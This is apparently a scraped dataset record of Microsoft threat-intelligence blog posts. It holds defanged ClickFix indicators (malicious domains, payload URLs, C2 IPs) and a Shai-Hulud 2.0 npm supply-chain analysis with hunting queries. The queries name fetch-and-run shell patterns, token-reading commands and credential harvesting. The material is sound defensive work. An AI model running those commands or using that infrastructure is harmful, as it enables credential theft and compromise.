2025-05-14 2025-05-14 access-ssa-gov[.]es Domain ClickFix landing page used in a phishing campaign impersonating Social Security Administration (SSA) 2025-06-02 2025-06-02 binancepizza[.]info Domain ClickFix landing page 2025-05-22 2025-05-22 panel-spectrum[.]net Domain ClickFix landing page used in a Atomic macOS Stealer (AMOS) campaign 2025-05-30 2025-05-30 access-ssa-gov[.]es/ClientSetup.exe URL URL used in ClickFix command (entered into Run dialog) in the SSA phishing campaign 2025-06-02 2025-06-02 applemacios[.]com/vv/install.sh URL URL used in ClickFix command (entered in the Bash shell) in the AMOS campaign 2025-05-30 2025-05-30 applemacios[.]com/vv/update URL URL used in the AMOS campaign to download the AMOS payload 2025-05-30 2025-05-30 guildmerger[.]co/verify/eminem URL ClickFix landing page used in OBSCURE#BAT campaign 2025-03-27 2025-03-27 files.catbox[.]moe/snenal.bat URL URL used in ClickFix command (entered into Run dialog) in the OBSCURE#BAT campaign 2025-03-27 2025-03-27 185.234.72[.]186 IP address IP address used in OBSCURE#BAT campaign for C2 2025-02-24 2025-02-24 45.94.31[.]176 IP address IP address used in OBSCURE#BAT campaign for C2 2025-03-27 2025-03-27 3.138.123[.]13 IP address IP address used in ClickFix command (entered into Run dialog) in the Lampion phishing campaign 2025-05-06 2025-05-06 16.171.23[.]221 IP address IP address used in Lampion malware campaign to download additional payloads 2025-05-06 2025-05-06 3.23.103[.]13 IP address IP address used in Lampion malware campaign for C2 2025-05-06 2025-05-06 83.242.96[.]159 IP address IP address used in Lampion malware campaign for C2 2025-05-06 2025-05-06 5.8.9[.]77 IP address IP address used in Lampion malware campaign for C2 2025-05-06 2025-05-06 References https://www.securonix.com/blog/analyzing-obscurebat-threat-actors-lure-victims-into-executing-malicious-batch-scripts-to-deploy-stealthy-rootkits/ https://www.cloudsek.com/blog/amos-variant-distributed-via-clickfix-in-spectrum-themed-dynamic-delivery-campaign-by-russian-speaking-hackers Learn more To know how Microsoft can help your team stop similar threats and prevent future compromise with human-led managed services, check out Microsoft Defender Experts for XDR . For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog . To get notified about new publications and to join discussions on social media, follow us on LinkedIn , X (formerly Twitter) , and Bluesky . To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast . Microsoft Threat Intelligence See posts by this author Microsoft Defender Experts See posts by this author Related posts February 10 15 min read Manipulating AI memory for profit: The rise of AI Recommendation Poisoning That helpful \u201cSummarize with AI\u201d button? It might be secretly manipulating what your AI recommends. February 9 3 min read A one-prompt attack that breaks LLM safety alignment As LLMs and diffusion models power more applications, their safety alignment becomes critical. February 6 5 min read Analysis of active exploitation of SolarWinds Web Help Desk We are seeing exploitation of SolarWinds Web Help Desk via CVE\u20112025\u201140551 and CVE\u20112025\u201140536 that can lead to domain compromise; here is how to patch, hunt, and mitigate now. Get started with Microsoft Security Protect your people, data, and infrastructure with AI-powered, end-to-end security from Microsoft. Learn how Connect with us on social X YouTube LinkedIn What's new Surface Pro Surface Laptop Surface Laptop Studio 2 Copilot for organizations Copilot for personal use AI in Windows Explore Microsoft products Windows 11 apps Microsoft Store Account profile Download Center Microsoft Store support Returns Order tracking Certified Refurbished Microsoft Store Promise Flexible Payments Education Microsoft in education Devices for education Microsoft Teams for Education Microsoft 365 Education How to buy for your school Educator training and development Deals for students and parents AI for education Business Microsoft AI Microsoft Security Dynamics 365 Microsoft 365 Microsoft Power Platform Microsoft Teams Microsoft 365 Copilot Small Business Developer & IT Azure Microsoft Developer Microsoft Learn Support for AI marketplace apps Microsoft Tech Community Microsoft Marketplace Marketplace Rewards Visual Studio Company Careers About Microsoft Company news Privacy at Microsoft Investors Diversity and inclusion Accessibility Sustainability English (United States) Your Privacy Choices Opt-Out Icon Your Privacy Choices Consumer Health Privacy Sitemap Contact Microsoft Privacy Manage cookies Terms of use Trademarks Safety & eco Recycling About our ads \u00a9 Microsoft 2026",
    "expected_count": 2
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/",
    "title": "Your Privacy Choices Opt-Out Icon",
    "content": "Skip to content Skip to main content Microsoft Microsoft Security Microsoft Security Microsoft Security Home Why Microsoft Security Solutions AI-powered cybersecurity Cloud security Data security & governance Identity & network access Privacy & risk management Security for AI Unified SecOps Zero Trust Products Product families Product families Microsoft Defender Microsoft Entra Microsoft Intune Microsoft Priva Microsoft Purview Microsoft Sentinel Security AI Security AI Microsoft Security Copilot Identity & access Identity & access Microsoft Entra ID (Azure Active Directory) Microsoft Entra Agent ID Microsoft Entra External ID Microsoft Entra ID Governance Microsoft Entra ID Protection Microsoft Entra Internet Access Microsoft Entra Private Access Microsoft Entra Permissions Management Microsoft Entra Verified ID Microsoft Entra Workload ID Microsoft Entra Domain Services Azure Key Vault SIEM & XDR SIEM & XDR Microsoft Sentinel Microsoft Defender for Cloud Microsoft Defender XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Defender for Identity Microsoft Defender for Cloud Apps Microsoft Security Exposure Management Microsoft Defender Vulnerability Management Microsoft Defender Threat Intelligence Cloud security Cloud security Microsoft Defender for Cloud Microsoft Defender Cloud Security Posture Mgmt Microsoft Defender External Attack Surface Management Azure Firewall Azure Web App Firewall Azure DDoS Protection GitHub Advanced Security Endpoint security & management Endpoint security & management Microsoft Defender for Endpoint Microsoft Defender XDR Microsoft Defender for Business Microsoft Intune core capabilities Microsoft Defender for IoT Microsoft Defender Vulnerability Management Microsoft Intune Advanced Analytics Microsoft Intune Endpoint Privilege Management\u200b Microsoft Intune Enterprise Application Management Microsoft Intune Remote Help Microsoft Cloud PKI Compliance & privacy Compliance & privacy Microsoft Purview Communication Compliance Microsoft Purview Compliance Manager Microsoft Purview Data Lifecycle Management Microsoft Purview eDiscovery Microsoft Purview Audit Microsoft Priva Risk Management Microsoft Priva Subject Rights Requests Data security & governance Data security & governance Microsoft Purview Information Protection Microsoft Purview Insider Risk Management Microsoft Purview Data Loss Prevention Microsoft Purview Data Governance Pricing Services Partners Resources Get started Get started Cybersecurity awareness Customer stories Security 101 Product trials How we protect Microsoft Reports and analysis Reports and analysis Industry recognition Microsoft Security Insider Microsoft Digital Defense Report Security Response Center Community Community Microsoft Security Blog Microsoft Security Events Microsoft Tech Community Documentation and training Documentation and training Documentation Technical Content Library Training & certifications Additional sites Additional sites Compliance Program for Microsoft Cloud Microsoft Trust Center Security Engineering Portal Service Trust Portal Microsoft Secure Future Initiative Business Solutions Hub Contact Sales Start free trial More All Microsoft Global Microsoft Security Azure Dynamics 365 Microsoft 365 Microsoft Teams Windows 365 Tech & innovation Tech & innovation Microsoft AI Azure Space Mixed reality Microsoft HoloLens Microsoft Viva Quantum computing Sustainability Industries Industries Education Automotive Financial services Government Healthcare Manufacturing Retail Partners Partners Find a partner Become a partner Partner Network Microsoft Marketplace Marketplace Rewards Software development companies Resources Resources Blog Microsoft Advertising Developer Center Documentation Events Licensing Microsoft Learn Microsoft Research View Sitemap Search Search Microsoft Security No results Cancel Home Shai-Hulud 2.0: Guidance for detecting, investigating, and defending against the supply chain attack Search Research December 9, 2025 10 min read Shai-Hulud 2.0: Guidance for detecting, investigating, and defending against the supply chain attack By Microsoft Defender Security Research Team Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Cloud Microsoft Defender for Endpoint Topics Cloud security Endpoint security Threat intelligence The Shai\u2011Hulud 2.0 supply chain attack represents one of the most significant cloud-native ecosystem compromises observed recently. Attackers maliciously modified hundreds of publicly available packages, targeting developer environments, continuous integration and continuous delivery (CI/CD) pipelines, and cloud-connected workloads to harvest credentials and configuration secrets. The Shai\u2011Hulud 2.0 campaign builds on earlier supply chain compromises but introduces more automation, faster propagation, and a broader target set: Malicious code executes during the preinstall phase of infected npm packages, allowing execution before tests or security checks. Attackers have compromised maintainer accounts from widely used projects (for example, Zapier, PostHog, Postman). Stolen credentials are exfiltrated to public attacker-controlled repositories, which could lead to further compromise. This campaign illustrates the risks inherent to modern supply chains: Traditional network defenses are insufficient against attacks embedded in trusted package workflows. Compromised credentials enable attackers to escalate privileges and move laterally across cloud workloads. In defending against threats like Shai-Hulud 2.0, organizations benefit significantly from the layered protection from Microsoft Defender, which provides security coverage from code, to posture management, to runtime. This defense-in-depth approach is especially valuable when facing supply chain-driven attacks that might introduce malicious dependencies that evade traditional vulnerability assessment tools. In these scenarios, the ability to correlate telemetry across data planes, such as endpoint or container behavior and runtime anomalies, becomes essential. Leveraging these insights enables security teams to rapidly identify compromised devices, flag suspicious packages, and contain the threat before it propagates further. This blog provides a high-level overview of Shai\u2011Hulud 2.0, the attack mechanisms, potential attack propagation paths, customized hunting queries, and the actions Microsoft Defender is taking to enhance detection, attack-path analysis, credential scanning, and supply chain hardening. Analyzing the Shai-Hulud 2.0 attack Multiple npm packages were compromised when threat actors added a preinstall script named set_bun.js in the package.json of the affected packages. The setup_bun.js script scoped the environment for an existing Bun runtime binary; if not found, the script installed it. Bun can be used in the same way Node.js is used. The Bun runtime executed the bundled malicious script bun_environment.js . This script downloaded and installed a GitHub Actions Runner archive. It then configured a new GitHub repository and a runner agent called SHA1Hulud . Additional files were extracted from the archive including, TruffleHog and Runner.Listener executables. TruffleHog was used to query the system for stored credentials and retrieve stored cloud credentials. Figure 1. Shai-Hulud 2.0 attack chain Microsoft Defender for Containers promptly notified our customers when the campaign began through the alert Suspicious usage of the shred command on hidden files detected . This alert identified the data destruction activity carried out as part of the campaign. Additionally, we introduced a dedicated alert to identify this campaign as Sha1-Hulud Campaign Detected \u2013 Possible command injection to exfiltrate credentials. In some cases, commits to the newly created repositories were under the name \u201cLinus Torvalds\u201d, the creator of the Linux kernel and the original author of Git. The use of fake personas highlights the importance of commit signature verification , which adds a simple and reliable check to confirm who actually created a commit and reduces the chance of impersonation. Figure 2. Malicious commit authored by user impersonating Linus Torvalds Mitigation and protection guidance Microsoft Defender recommends the following guidance for customers to improve their environments\u2019 security posture against Shai-Hulud: Review the Key Vault assets on the critical asset management page and investigate any relevant logs for unauthorized access. Rapidly rotate and revoke exposed credentials. Isolate affected CI/CD agents or workspaces. Prioritize high-risk attack paths to reduce further exposure. Remove unnecessary roles and permissions granted to identities assigned to CI/CD pipelines; specifically review access to key vaults. For Defender for Cloud customers, read on the following recommendation: As previously indicated, the attack was initiated during the preinstall phase of compromised npm packages. Consequently, cloud compute workloads that rely on these affected packages present a lower risk compared to those involved in the build phase. Nevertheless, it is advisable to refrain from using such packages within cloud workloads. Defender for Cloud conducts thorough scans of workloads and prompts users to upgrade or replace any compromised packages if vulnerable versions are detected. Additionally, it references the code repository from which the image was generated to facilitate effective investigation. To receive code repository mapping, make sure to connect your DevOps environments to Defender for Cloud. Refer to the following documentation for guidance on: Connecting Azure DevOps to Defender for Cloud Connecting GitHub environment to Defender for Cloud Connecting GitLab environment to Defender for Cloud Deploying Defender CLI for container image scan Figure 3. Defender for Cloud Recommendations page For npm maintainers: Use npm trusted publishing instead of tokens. Strengthen publishing settings on accounts, organizations, and packages to require two-factor authentication (2FA) for any writes and publishing actions. When configuring two-factor authentication , use WebAuthn instead of a time-based, one-time password (TOTP). To combat this evolving threat, we are also introducing a new functionality in Microsoft Defender for Cloud that identifies Shai-Hulud 2.0 packages by leveraging agentless code scanning . This capability works by creating a Software Bill of Materials (SBOM) in the background and performing a lookup to identify if any package in the filesystem or source code repository is a malicious package that could be a component of the Shai-Hulud attack. By decoupling security analysis from runtime execution, this approach ensures that deep dependency threats are detected without impacting the performance of workloads or pipelines. If malicious packages are found, recommendations in Microsoft Defender for Cloud provide immediate visibility into compromised assets as shown below. This ensures that security teams can act quickly to freeze dependencies and rotate credentials before further propagation occurs. The next recommended step for customers is to start scanning repositories and protecting supply chains. Learn how to set up connectors . Figure 4. Recommendations resulting from agentless code scanning Turn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. Turn on attack surface reduction rules , particularly on blocking executable files from running unless they meet a prevalence, age or trusted list criterion and blocking execution of potentially obfuscated scripts . For more information on GitHub\u2019s plans on securing the npm supply chain and what npm maintainers can take today, Defender also recommends checking the Github plan for a more secure npm supply chain . Microsoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence. Tactic Observed activity Microsoft Defender coverage Execution Suspicious behavior surrounding node execution Microsoft Defender for Endpoint \u2013 Suspicious Node.js process behavior Microsoft Defender Antivirus \u2013 Trojan:JS/ShaiWorm Execution Registration of impacted containers as self-hosted GitHub runners and using them to gather credentials. Microsoft Defender for Containers \u2013 Sha1-Hulud Campaign Detected: Possible command injection to exfiltrate credentials Microsoft Defender for Endpoint \u2013 Suspicious process launched Impact Data destruction activity Microsoft Defender for Containers \u2013 Suspicious usage of shared command on hidden files detected Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following prebuilt promptbooks to automate incident response or investigation tasks related to this threat: Incident investigation Microsoft User analysis Threat actor profile Threat Intelligence 360 report based on MDTI article Vulnerability impact assessment Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel. Threat intelligence reports Microsoft Defender XDR customers can use the following threat analytics reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments. Microsoft Defender XDR threat analytics: Activity Profile: From vulnerable workflows to self-replicating malware: Technical analysis of npm supply chain security incidents Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor. Attack path analysis Attack path analysis shows paths from exposed entry points to targets. Security teams can use attack path analysis to surface cross-domain exposure risks, for example how an attacker could move from externally reachable resources to sensitive systems to escalate privileges and maintain persistence. While supply chain attacks like those used by Shai-Hulud 2.0 can originate without direct exposure, customers can leverage advanced hunting to query the Exposure Graph for these broader relationships. For example, once a virtual or physical machine is determined to be compromised, key vaults that are directly accessible using credentials obtained from the compromised system can also be identified. The relevant access paths can be extracted using queries, as detailed in the hunting section below. Any key vault found along these paths should be investigated according to the mitigation guide. Hunting queries Microsoft Defender XDR Microsoft Defender XDR customers can run the following queries to find related activity in their networks: Attempts of malicious JS execution through node DeviceProcessEvents | where FileName has \"node\" and ProcessCommandLine has_any (\"setup_bun.js\", \"bun_environment.js\") Suspicious process launched by malicious JavaScript DeviceProcessEvents | where InitiatingProcessFileName in~ (\"node\", \"node.exe\") and InitiatingProcessCommandLine endswith \".js\" | where (FileName in~ (\"bun\", \"bun.exe\") and ProcessCommandLine has \".js\") or (FileName in~ (\"cmd.exe\") and ProcessCommandLine has_any (\"where bun\", \"irm \", \"[Environment]::GetEnvironmentVariable('PATH'\", \"|iex\")) or (ProcessCommandLine in~ (\"sh\", \"dash\", \"bash\") and ProcessCommandLine has_any (\"which bun\", \".bashrc && echo $PATH\", \"https://bun.sh/install\")) | where ProcessCommandLine !contains \"bun\" and ProcessCommandLine !contains \"\\\\\" and ProcessCommandLine !contains \"--\" GitHub exfiltration DeviceProcessEvents | where FileName has_any (\"bash\",\"Runner.Listener\",\"cmd.exe\") | where ProcessCommandLine has 'SHA1HULUD' and not (ProcessCommandLine has_any('malicious','grep','egrep',\"checknpm\",\"sha1hulud-checker-ado\",\"sha1hulud-checker-ado\",\" sha1hulud-checker-github\",\"sha1hulud-checker\",\"sha1hulud-scanner\",\"go-detector\",\"SHA1HULUD_IMMEDIATE_ACTIONS.md\",\"SHA1HULUD_COMPREHENSIVE_REPORT.md\",\"reddit.com\",\"sha1hulud-scan.sh\")) Paths from compromised machines and repositories to cloud key management services let T_src2Key = ExposureGraphEdges | where EdgeLabel == 'contains' | where SourceNodeCategories has_any ('code_repository', 'virtual_machine' , 'physical_device') | where TargetNodeCategories has 'secret' | project SourceNodeId, SourceNodeLabel, SourceNodeName, keyNodeId=TargetNodeId, keyNodeLabel=TargetNodeLabel; let T_key2identity = ExposureGraphEdges | where EdgeLabel == 'can authenticate as' | where SourceNodeCategories has 'key' | where TargetNodeCategories has 'identity' | project keyNodeId=SourceNodeId, identityNodeId=TargetNodeId; ExposureGraphEdges | where EdgeLabel == 'has permissions to' | where SourceNodeCategories has 'identity' | where TargetNodeCategories has \"keys_management_service\" | join hint.strategy=shuffle kind=inner (T_key2identity) on $left.SourceNodeId==$right.identityNodeId | join hint.strategy=shuffle kind=inner (T_src2Key) on keyNodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, srcEntityId=EntityIds) on $left.SourceNodeId1==$right.NodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, identityEntityId=EntityIds) on $left.identityNodeId==$right.NodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, kmsEntityId=EntityIds) on $left.TargetNodeId==$right.NodeId | project srcLabel=SourceNodeLabel1, srcName=SourceNodeName1, srcEntityId, keyNodeLabel, identityLabel=SourceNodeLabel, identityName=SourceNodeName, identityEntityId, kmsLabel=TargetNodeLabel, kmsName=TargetNodeName, kmsEntityId | extend Path = strcat('srcLabel',' contains','keyNodeLabel',' can authenticate as', ' identityLabel', ' has permissions to', ' kmsLabel') Setup of the GitHub runner with the malicious repository and downloads of the malicious bun.sh script that facilitates this CloudProcessEvents | where (ProcessCommandLine has \"--name SHA1HULUD\" ) or (ParentProcessName == \"node\" and (ProcessName == \"bash\" or ProcessName == \"dash\" or ProcessName == \"sh\") and ProcessCommandLine has \"curl -fsSL https://bun.sh/install | bash\") | project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName Credential collection using TruffleHog and Azure CLI CloudProcessEvents | where (ParentProcessName == \"bun\" and ProcessName in (\"bash\",\"dash\",\"sh\") and ProcessCommandLine has_any(\"az account get-access-token\",\"azd auth token\")) or (ParentProcessName == \"bun\" and ProcessName == \"tar\" and ProcessCommandLine has_any (\"trufflehog\",\"truffler-cache\")) | project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName Cloud security explorer Microsoft Defender for Cloud customers can also use cloud security explorer to surface possibly compromised software packages. The following screenshot represents a query that searches for a virtual machine or repository allowing lateral movement to a key vault. View the query builder . Figure 5. Cloud security explorer query The security explorer templates library has been expanded with two additional queries that retrieve all container images with compromised software packages and all the running containers with these images. Another means for security teams to proactively identify the scope of this threat is by leveraging the Cloud Security Explorer to query the granular Software Bill of Materials (SBOM) generated by agentless scanners. This capability allows you to execute dynamic, graph-based queries across your entire multi-cloud estate\u2014including virtual machines, containers, and code repositories\u2014to pinpoint specific software components and their versions without the need for agent deployment. For the Shai-Hulud 2.0 campaign, you can use the Cloud Security Explorer to map your software inventory directly to the list of known malicious packages. By running targeted queries that search for the specific compromised package names identified in our threat intelligence, you can instantly visualize the blast radius of the attack within your environment. This enables you to locate every asset containing a malicious dependency and prioritize remediation efforts effectively. Figure 6. Cloud Security Explorer query Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace. Indicators of compromise Indicator Type Description First seen Last seen setup_bun.js File name Malicious script that installs the Bun runtime November 24, 2025 December 1, 2025 bun_environment.js File name Script that facilitates credential gathering and exfiltration November 24, 2025 December 1, 2025 References https://www.aikido.dev/blog/shai-hulud-strikes-again-hitting-zapier-ensdomains Learn more For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog . To get notified about new publications and to join discussions on social media, follow us on LinkedIn , X (formerly Twitter) , and Bluesky . To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast . Microsoft Defender Security Research Team See Microsoft Defender Security Research Team posts Related posts February 10 15 min read Manipulating AI memory for profit: The rise of AI Recommendation Poisoning That helpful \u201cSummarize with AI\u201d button? It might be secretly manipulating what your AI recommends. February 9 3 min read A one-prompt attack that breaks LLM safety alignment As LLMs and diffusion models power more applications, their safety alignment becomes critical. February 6 5 min read Analysis of active exploitation of SolarWinds Web Help Desk We are seeing exploitation of SolarWinds Web Help Desk via CVE\u20112025\u201140551 and CVE\u20112025\u201140536 that can lead to domain compromise; here is how to patch, hunt, and mitigate now. Get started with Microsoft Security Protect your people, data, and infrastructure with AI-powered, end-to-end security from Microsoft. Learn how Connect with us on social X YouTube LinkedIn What's new Surface Pro Surface Laptop Surface Laptop Studio 2 Copilot for organizations Copilot for personal use AI in Windows Explore Microsoft products Windows 11 apps Microsoft Store Account profile Download Center Microsoft Store support Returns Order tracking Certified Refurbished Microsoft Store Promise Flexible Payments Education Microsoft in education Devices for education Microsoft Teams for Education Microsoft 365 Education How to buy for your school Educator training and development Deals for students and parents AI for education Business Microsoft AI Microsoft Security Dynamics 365 Microsoft 365 Microsoft Power Platform Microsoft Teams Microsoft 365 Copilot Small Business Developer & IT Azure Microsoft Developer Microsoft Learn Support for AI marketplace apps Microsoft Tech Community Microsoft Marketplace Marketplace Rewards Visual Studio Company Careers About Microsoft Company news Privacy at Microsoft Investors Diversity and inclusion Accessibility Sustainability English (United States) Your Privacy Choices Opt-Out Icon Your Privacy Choices Consumer Health Privacy Sitemap Contact Microsoft Privacy Manage cookies Terms of use Trademarks Safety & eco Recycling About our ads \u00a9 Microsoft 2026",
    "filtered_content": "Skip to content Skip to main content Microsoft Microsoft Security Microsoft Security Microsoft Security Home Why Microsoft Security Solutions AI-powered cybersecurity Cloud security Data security & governance Identity & network access Privacy & risk management Security for AI Unified SecOps Zero Trust Products Product families Product families Microsoft Defender Microsoft Entra Microsoft Intune Microsoft Priva Microsoft Purview Microsoft Sentinel Security AI Security AI Microsoft Security Copilot Identity & access Identity & access Microsoft Entra ID (Azure Active Directory) Microsoft Entra Agent ID Microsoft Entra External ID Microsoft Entra ID Governance Microsoft Entra ID Protection Microsoft Entra Internet Access Microsoft Entra Private Access Microsoft Entra Permissions Management Microsoft Entra Verified ID Microsoft Entra Workload ID Microsoft Entra Domain Services Azure Key Vault SIEM & XDR SIEM & XDR Microsoft Sentinel Microsoft Defender for Cloud Microsoft Defender XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Defender for Identity Microsoft Defender for Cloud Apps Microsoft Security Exposure Management Microsoft Defender Vulnerability Management Microsoft Defender Threat Intelligence Cloud security Cloud security Microsoft Defender for Cloud Microsoft Defender Cloud Security Posture Mgmt Microsoft Defender External Attack Surface Management Azure Firewall Azure Web App Firewall Azure DDoS Protection GitHub Advanced Security Endpoint security & management Endpoint security & management Microsoft Defender for Endpoint Microsoft Defender XDR Microsoft Defender for Business Microsoft Intune core capabilities Microsoft Defender for IoT Microsoft Defender Vulnerability Management Microsoft Intune Advanced Analytics Microsoft Intune Endpoint Privilege Management\u200b Microsoft Intune Enterprise Application Management Microsoft Intune Remote Help Microsoft Cloud PKI Compliance & privacy Compliance & privacy Microsoft Purview Communication Compliance Microsoft Purview Compliance Manager Microsoft Purview Data Lifecycle Management Microsoft Purview eDiscovery Microsoft Purview Audit Microsoft Priva Risk Management Microsoft Priva Subject Rights Requests Data security & governance Data security & governance Microsoft Purview Information Protection Microsoft Purview Insider Risk Management Microsoft Purview Data Loss Prevention Microsoft Purview Data Governance Pricing Services Partners Resources Get started Get started Cybersecurity awareness Customer stories Security 101 Product trials How we protect Microsoft Reports and analysis Reports and analysis Industry recognition Microsoft Security Insider Microsoft Digital Defense Report Security Response Center Community Community Microsoft Security Blog Microsoft Security Events Microsoft Tech Community Documentation and training Documentation and training Documentation Technical Content Library Training & certifications Additional sites Additional sites Compliance Program for Microsoft Cloud Microsoft Trust Center Security Engineering Portal Service Trust Portal Microsoft Secure Future Initiative Business Solutions Hub Contact Sales Start free trial More All Microsoft Global Microsoft Security Azure Dynamics 365 Microsoft 365 Microsoft Teams Windows 365 Tech & innovation Tech & innovation Microsoft AI Azure Space Mixed reality Microsoft HoloLens Microsoft Viva Quantum computing Sustainability Industries Industries Education Automotive Financial services Government Healthcare Manufacturing Retail Partners Partners Find a partner Become a partner Partner Network Microsoft Marketplace Marketplace Rewards Software development companies Resources Resources Blog Microsoft Advertising Developer Center Documentation Events Licensing Microsoft Learn Microsoft Research View Sitemap Search Search Microsoft Security No results Cancel Home Shai-Hulud 2.0: Guidance for detecting, investigating, and defending against the supply chain attack Search Research December 9, 2025 10 min read Shai-Hulud 2.0: Guidance for detecting, investigating, and defending against the supply chain attack By Microsoft Defender Security Research Team Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Cloud Microsoft Defender for Endpoint Topics Cloud security Endpoint security Threat intelligence The Shai\u2011Hulud 2.0 supply chain attack represents one of the most significant cloud-native ecosystem compromises observed recently. Attackers maliciously modified hundreds of publicly available packages, targeting developer environments, continuous integration and continuous delivery (CI/CD) pipelines, and cloud-connected workloads to harvest credentials and configuration secrets. The Shai\u2011Hulud 2.0 campaign builds on earlier supply chain compromises but introduces more automation, faster propagation, and a broader target set: Malicious code executes during the preinstall phase of infected npm packages, allowing execution before tests or security checks. Attackers have compromised maintainer accounts from widely used projects (for example, Zapier, PostHog, Postman). Stolen credentials are exfiltrated to public attacker-controlled repositories, which could lead to further compromise. This campaign illustrates the risks inherent to modern supply chains: Traditional network defenses are insufficient against attacks embedded in trusted package workflows. Compromised credentials enable attackers to escalate privileges and move laterally across cloud workloads. In defending against threats like Shai-Hulud 2.0, organizations benefit significantly from the layered protection from Microsoft Defender, which provides security coverage from code, to posture management, to runtime. This defense-in-depth approach is especially valuable when facing supply chain-driven attacks that might introduce malicious dependencies that evade traditional vulnerability assessment tools. In these scenarios, the ability to correlate telemetry across data planes, such as endpoint or container behavior and runtime anomalies, becomes essential. Leveraging these insights enables security teams to rapidly identify compromised devices, flag suspicious packages, and contain the threat before it propagates further. This blog provides a high-level overview of Shai\u2011Hulud 2.0, the attack mechanisms, potential attack propagation paths, customized hunting queries, and the actions Microsoft Defender is taking to enhance detection, attack-path analysis, credential scanning, and supply chain hardening. Analyzing the Shai-Hulud 2.0 attack Multiple npm packages were compromised when threat actors added a preinstall script named set_bun.js in the package.json of the affected packages. The setup_bun.js script scoped the environment for an existing Bun runtime binary; if not found, the script installed it. Bun can be used in the same way Node.js is used. The Bun runtime executed the bundled malicious script bun_environment.js . This script downloaded and installed a GitHub Actions Runner archive. It then configured a new GitHub repository and a runner agent called SHA1Hulud . Additional files were extracted from the archive including, TruffleHog and Runner.Listener executables. TruffleHog was used to query the system for stored credentials and retrieve stored cloud credentials. Figure 1. Shai-Hulud 2.0 attack chain Microsoft Defender for Containers promptly notified our customers when the campaign began through the alert Suspicious usage of the shred command on hidden files detected . This alert identified the data destruction activity carried out as part of the campaign. Additionally, we introduced a dedicated alert to identify this campaign as Sha1-Hulud Campaign Detected \u2013 Possible command injection to exfiltrate credentials. In some cases, commits to the newly created repositories were under the name \u201cLinus Torvalds\u201d, the creator of the Linux kernel and the original author of Git. The use of fake personas highlights the importance of commit signature verification , which adds a simple and reliable check to confirm who actually created a commit and reduces the chance of impersonation. Figure 2. Malicious commit authored by user impersonating Linus Torvalds Mitigation and protection guidance Microsoft Defender recommends the following guidance for customers to improve their environments\u2019 security posture against Shai-Hulud: Review the Key Vault assets on the critical asset management page and investigate any relevant logs for unauthorized access. Rapidly rotate and revoke exposed credentials. Isolate affected CI/CD agents or workspaces. Prioritize high-risk attack paths to reduce further exposure. Remove unnecessary roles and permissions granted to identities assigned to CI/CD pipelines; specifically review access to key vaults. For Defender for Cloud customers, read on the following recommendation: As previously indicated, the attack was initiated during the preinstall phase of compromised npm packages. Consequently, cloud compute workloads that rely on these affected packages present a lower risk compared to those involved in the build phase. Nevertheless, it is advisable to refrain from using such packages within cloud workloads. Defender for Cloud conducts thorough scans of workloads and prompts users to upgrade or replace any compromised packages if vulnerable versions are detected. Additionally, it references the code repository from which the image was generated to facilitate effective investigation. To receive code repository mapping, make sure to connect your DevOps environments to Defender for Cloud. Refer to the following documentation for guidance on: Connecting Azure DevOps to Defender for Cloud Connecting GitHub environment to Defender for Cloud Connecting GitLab environment to Defender for Cloud Deploying Defender CLI for container image scan Figure 3. Defender for Cloud Recommendations page For npm maintainers: Use npm trusted publishing instead of tokens. Strengthen publishing settings on accounts, organizations, and packages to require two-factor authentication (2FA) for any writes and publishing actions. When configuring two-factor authentication , use WebAuthn instead of a time-based, one-time password (TOTP). To combat this evolving threat, we are also introducing a new functionality in Microsoft Defender for Cloud that identifies Shai-Hulud 2.0 packages by leveraging agentless code scanning . This capability works by creating a Software Bill of Materials (SBOM) in the background and performing a lookup to identify if any package in the filesystem or source code repository is a malicious package that could be a component of the Shai-Hulud attack. By decoupling security analysis from runtime execution, this approach ensures that deep dependency threats are detected without impacting the performance of workloads or pipelines. If malicious packages are found, recommendations in Microsoft Defender for Cloud provide 